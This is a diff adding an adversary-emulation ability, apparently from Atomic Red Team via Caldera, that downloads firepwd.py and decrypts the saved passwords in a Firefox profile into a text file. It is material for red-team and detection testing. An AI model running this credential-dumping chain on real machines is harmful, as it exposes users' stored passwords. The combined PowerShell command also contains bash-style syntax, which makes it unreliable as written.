@@ -1,0 +1,196 @@
+- id: dc9cd677-c70f-4df5-bd1c-f114af3c2381
+  name: Decrypt Mozilla Passwords with Firepwd.py
+  description: "Firepwd.py is a script that can decrypt Mozilla (Thunderbird, Firefox)\
+    \ passwords.\nUpon successful execution, the decrypted credentials will be output\
+    \ to a text file, as well as displayed on screen. \n\nWill create a Python virtual\
+    \ environment within the External Payloads folder that can be deleted manually\
+    \ post test execution."
+  tactic: credential-access
+  technique:
+    attack_id: T1555.003
+    name: 'Credentials from Password Stores: Credentials from Web Browsers'
+  platforms:
+    windows:
+      psh:
+        command: 'if (get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\"
+          -erroraction silentlycontinue) {exit 0} else {exit 1}; then : ; else New-Item
+          -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction
+          Ignore -Force | Out-Null; Invoke-WebRequest "https://ftp.mozilla.org/pub/firefox/releases/98.0/win64/en-US/Firefox%20Setup%2098.0.msi"
+          -outfile "PathToAtomicsFolder\..\ExternalPayloads\firefox.msi"; msiexec.exe
+          /i "PathToAtomicsFolder\..\ExternalPayloads\firefox.msi" /quiet; sleep -s
+          30; start-process "$env:programfiles\Mozilla Firefox\firefox.exe".; sleep
+          -s 5; stop-process -name "firefox"; fi; if (Test-Path "C:\Program Files
+          (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat")
+          {exit 0} else {exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
+          -ErrorAction ignore -Force | Out-Null; invoke-webrequest "https://aka.ms/vs/17/release/vs_BuildTools.exe"
+          -outfile "PathToAtomicsFolder\..\ExternalPayloads\VS_BuildTools.exe"; write-host
+          "Visual Studio Build Tools (Desktop Development with C++) must be installed
+          manually. Please run the installer from PathToAtomicsFolder\..\ExternalPayloads\VS_BuildTools.exe.";
+          fi; if (Test-Path "C:\Program Files\Python310\python.exe") {exit 0} else
+          {exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
+          -ErrorAction ignore -Force | Out-Null; invoke-webrequest "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe"
+          -outfile "PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe"; Start-Process
+          -FilePath "PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe" -ArgumentList
+          "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0" -Wait; fi; if (Test-Path
+          -Path "PathToAtomicsFolder\..\ExternalPayloads\venv_t1555.004") { exit 0
+          } else { exit 1 }; then : ; else py -m venv "PathToAtomicsFolder\..\ExternalPayloads\venv_t1555.004";
+          fi; if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\venv_t1555.004\Scripts\Firepwd.py")
+          {exit 0} else {exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
+          -ErrorAction ignore -Force | Out-Null; Invoke-WebRequest "https://raw.githubusercontent.com/lclevy/firepwd/167eabf3b88d5a7ba8b8bc427283f827b6885982/firepwd.py"
+          -outfile "PathToAtomicsFolder\..\ExternalPayloads\venv_t1555.004\Scripts\Firepwd.py";
+          fi; if (PathToAtomicsFolder\..\ExternalPayloads\venv_t1555.004\Scripts\pip.exe
+          show pycryptodome) {exit 0} else {exit 1}; then : ; else if (test-path "C:\Program
+          Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat"){PathToAtomicsFolder\..\ExternalPayloads\venv_t1555.004\Scripts\pip.exe
+          install pycryptodome | out-null | cmd /c %comspec% /k "C:\Program Files
+          (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat"
+          | out-null} else {write-host "Visual Studio Build Tools (C++ Support) must
+          be installed to continue gathering this prereq"}; fi; if (PathToAtomicsFolder\..\ExternalPayloads\venv_t1555.004\Scripts\pip.exe
+          show pyasn1) {exit 0} else {exit 1}; then : ; else if (test-path "C:\Program
+          Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat")
+          & {PathToAtomicsFolder\..\ExternalPayloads\venv_t1555.004\Scripts\pip.exe
+          install pyasn1 | out-null | cmd /c %comspec% /k "C:\Program Files (x86)\Microsoft
+          Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat" | out-null}
+          else {write-host "Visual Studio Build Tools (C++ Support) must be installed
+          to continue gathering this prereq."}; fi; $PasswordDBLocation = get-childitem
+          -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\"; cmd /c
+          PathToAtomicsFolder\..\ExternalPayloads\venv_t1555.004\Scripts\python.exe
+          PathToAtomicsFolder\..\ExternalPayloads\venv_t1555.004\Scripts\Firepwd.py
+          -d $PasswordDBLocation > $env:temp\T1555.003Test8.txt; cat $env:temp\T1555.003Test8.txt'
+        cleanup: Remove-Item -Path "#{Out_Filepath}" -erroraction silentlycontinue
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - credential-access
+  - atomic-red-team
+  - t1555.003
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      Firepwd_Path:
+        description: Filepath for Firepwd.py
+        type: string
+        default: PathToAtomicsFolder\..\ExternalPayloads\venv_t1555.004\Scripts\Firepwd.py
+      Out_Filepath:
+        description: Filepath to output results to
+        type: string
+        default: $env:temp\T1555.003Test8.txt
+      VS_CMD_Path:
+        description: Filepath to Visual Studio Build Tools Command prompt
+        type: string
+        default: C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat
+      Python_Path:
+        description: Filepath to python
+        type: string
+        default: C:\Program Files\Python310\python.exe
+      venv_path:
+        description: Path to the folder for the tactics venv
+        type: string
+        default: PathToAtomicsFolder\..\ExternalPayloads\venv_t1555.004
+    dependencies:
+    - description: 'Firefox profile directory must be present
+
+        '
+      prereq_command: 'if (get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\"
+        -erroraction silentlycontinue) {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
+        -ErrorAction Ignore -Force | Out-Null
+
+        Invoke-WebRequest "https://ftp.mozilla.org/pub/firefox/releases/98.0/win64/en-US/Firefox%20Setup%2098.0.msi"
+        -outfile "PathToAtomicsFolder\..\ExternalPayloads\firefox.msi"
+
+        msiexec.exe /i "PathToAtomicsFolder\..\ExternalPayloads\firefox.msi" /quiet
+
+        sleep -s 30
+
+        start-process "$env:programfiles\Mozilla Firefox\firefox.exe".
+
+        sleep -s 5
+
+        stop-process -name "firefox"
+
+        '
+    - description: 'Visual Studio Build Tools command prompt must exist at #{VS_CMD_Path}
+
+        '
+      prereq_command: 'if (Test-Path "#{VS_CMD_Path}") {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
+        -ErrorAction ignore -Force | Out-Null
+
+        invoke-webrequest "https://aka.ms/vs/17/release/vs_BuildTools.exe" -outfile
+        "PathToAtomicsFolder\..\ExternalPayloads\VS_BuildTools.exe"
+
+        write-host "Visual Studio Build Tools (Desktop Development with C++) must
+        be installed manually. Please run the installer from PathToAtomicsFolder\..\ExternalPayloads\VS_BuildTools.exe."
+
+        '
+    - description: 'Python must be installed
+
+        '
+      prereq_command: 'if (Test-Path "#{Python_Path}") {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
+        -ErrorAction ignore -Force | Out-Null
+
+        invoke-webrequest "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe"
+        -outfile "PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe"
+
+        Start-Process -FilePath "PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe"
+        -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0" -Wait
+
+        '
+    - description: 'Computer must have venv configured at #{venv_path}
+
+        '
+      prereq_command: 'if (Test-Path -Path "#{venv_path}") { exit 0 } else { exit
+        1 }
+
+        '
+      get_prereq_command: 'py -m venv "#{venv_path}"
+
+        '
+    - description: 'Firepwd must exist at #{Firepwd_Path}
+
+        '
+      prereq_command: 'if (Test-Path "#{Firepwd_Path}") {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
+        -ErrorAction ignore -Force | Out-Null
+
+        Invoke-WebRequest "https://raw.githubusercontent.com/lclevy/firepwd/167eabf3b88d5a7ba8b8bc427283f827b6885982/firepwd.py"
+        -outfile "#{Firepwd_Path}"
+
+        '
+    - description: "Pycryptodome library must be installed \n"
+      prereq_command: 'if (#{venv_path}\Scripts\pip.exe show pycryptodome) {exit 0}
+        else {exit 1}
+
+        '
+      get_prereq_command: 'if (test-path "#{VS_CMD_Path}"){#{venv_path}\Scripts\pip.exe
+        install pycryptodome | out-null | cmd /c %comspec% /k "#{VS_CMD_Path}" | out-null}
+        else {write-host "Visual Studio Build Tools (C++ Support) must be installed
+        to continue gathering this prereq"}
+
+        '
+    - description: "Pyasn1 library must be installed \n"
+      prereq_command: 'if (#{venv_path}\Scripts\pip.exe show pyasn1) {exit 0} else
+        {exit 1}
+
+        '
+      get_prereq_command: 'if (test-path "#{VS_CMD_Path}") & {#{venv_path}\Scripts\pip.exe
+        install pyasn1 | out-null | cmd /c %comspec% /k "#{VS_CMD_Path}" | out-null}
+        else {write-host "Visual Studio Build Tools (C++ Support) must be installed
+        to continue gathering this prereq."}
+
+        '
+    technique_created: '2020-02-12T18:57:36.041Z'
+    atomic_guid: dc9cd677-c70f-4df5-bd1c-f114af3c2381
+    import_timestamp: '2025-06-24T11:15:06.291885Z'
